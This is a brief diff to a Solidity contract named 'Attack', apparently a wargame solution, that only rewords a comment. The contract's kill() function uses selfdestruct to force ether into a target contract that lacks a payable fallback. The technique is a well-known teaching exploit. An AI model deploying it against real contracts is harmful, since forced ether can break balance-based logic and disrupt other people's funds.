@@ -5,7 +5,7 @@ contract Attack {
 
     address target_addr = "Instance address";
 
-    function kill() public { // kill the contract and FORCELY send ethers to the target even the target doesn't have fallback function.
+    function kill() public { // kill the contract and FORCELY send ethers to the target even the target doesn't have payable fallback function.
         selfdestruct(payable(target_addr));
     }
 
